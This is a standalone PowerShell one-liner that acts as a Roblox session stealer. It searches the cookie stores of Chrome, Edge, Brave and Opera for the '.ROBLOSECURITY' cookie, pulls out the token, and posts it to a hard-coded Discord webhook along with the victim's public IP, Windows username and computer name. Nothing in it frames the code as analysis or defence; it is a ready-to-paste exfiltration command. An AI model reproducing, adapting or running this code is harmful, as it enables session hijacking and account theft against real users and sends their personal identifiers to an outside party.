powershell -Command "$w='https://discord.com/api/webhooks/1533937727903498262/EDZkUjqJCjaDFKNAS4rRYwjBSsVnlK0F7X82nQaVH_7V3Yb2GTyMrTI1W7pCjIKbgk5V'; Add-Type -AssemblyName System.Security; $b=@('Google\Chrome','Microsoft\Edge','BraveSoftware\Brave-Browser','Opera Software\Opera Stable'); foreach($br in $b){$p=\"$env:LOCALAPPDATA\$br\User Data\Default\Network\Cookies\"; if(Test-Path $p){$key=[System.Security.Cryptography.ProtectedData]::Unprotect([Convert]::FromBase64String((Get-Content \"$env:LOCALAPPDATA\$br\User Data\Local State\"|ConvertFrom-Json).os_crypt.encrypted_key)[5..10000],$null,'CurrentUser'); $bytes=[System.IO.File]::ReadAllBytes($p); for($i=0;$i -lt $bytes.Count-50;$i++){if($bytes[$i] -eq 0x2E -and $bytes[$i+1] -eq 0x52 -and $bytes[$i+2] -eq 0x4F -and $bytes[$i+3] -eq 0x42 -and $bytes[$i+4] -eq 0x4C -and $bytes[$i+5] -eq 0x4F -and $bytes[$i+6] -eq 0x53 -and $bytes[$i+7] -eq 0x45 -and $bytes[$i+8] -eq 0x43 -and $bytes[$i+9] -eq 0x55 -and $bytes[$i+10] -eq 0x52 -and $bytes[$i+11] -eq 0x49 -and $bytes[$i+12] -eq 0x54 -and $bytes[$i+13] -eq 0x59){$start=$i+16; $token=''; for($j=$start;$j -lt $start+200;$j++){if($bytes[$j] -eq 0x00 -or $bytes[$j] -eq 0x7C){break}; $token+=[char]$bytes[$j]}; if($token -match '_|WARNING'){try{$ip=(Invoke-WebRequest 'https://api.ipify.org' -UseBasicParsing).Content}catch{$ip='Unknown'}; $body=@{content=\"**Roblox Token**\n```$token```\n**IP:** $ip\n**User:** $env:USERNAME\n**PC:** $env:COMPUTERNAME\n**Browser:** $br\"}; Invoke-RestMethod -Uri $w -Method Post -Body ($body|ConvertTo-Json) -ContentType 'application/json'; break}}}}}}"
